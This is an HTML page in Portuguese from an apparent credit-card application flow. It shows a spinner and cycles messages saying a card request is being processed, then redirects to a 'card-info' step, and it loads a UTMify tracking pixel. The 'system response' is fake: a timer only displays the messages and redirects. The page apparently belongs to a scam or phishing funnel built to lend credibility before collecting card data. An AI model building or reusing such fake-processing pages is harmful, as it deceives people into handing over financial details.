<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../assets/style.css">
    <style>
        .main-content {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: radial-gradient(934px at 6% 39.5%, rgb(255, 35, 90) 0.2%, rgb(255, 35, 144) 54.8%, rgb(250, 99, 160) 93.4%);
            color: white;
            text-align: center;
            flex-direction: column;
        }

        .main-content {
            max-width: 100%;
            padding: 20px;
            border-top: solid 1px #ff7fc1;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            margin: 0px auto !important;
            border-radius: 0px !important;
        }

        .loading-content {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div class="main-content">
        <div id="loading-section" class="loading-section" style="display: flex;position: relative;top: -14rem;">
            <div class="loading-content">
                <div class="spinner"></div>
                <p id="loading-text" style="font-size: 22px;">Aguarde a resposta do sistema...</p>
            </div>
        </div>
    </div>

    <script>
        function iniciarCarregamento() {
            const frases = [
                "O cartão de Crédito está sendo solicitado...",
                "Aguarde a Resposta do Sistema.",
                "Solicitação em Andamento."
            ];
            let fraseIndex = 0;
            document.getElementById('loading-section').style.display = 'flex';
            const fraseInterval = setInterval(() => {
                if (fraseIndex < frases.length) {
                    document.getElementById('loading-text').innerText = frases[fraseIndex];
                    fraseIndex++;
                } else {
                    fraseIndex = 0; // Reinicia as frases para continuar o loop
                }
            }, 1000);
            
            setTimeout(() => {
                clearInterval(fraseInterval);
                window.location.href = '../8-card-info/index.php'; // Substitua pela URL desejada
            }, 6000);
        }

        // Iniciar o carregamento ao carregar a seção
        iniciarCarregamento();
    </script>
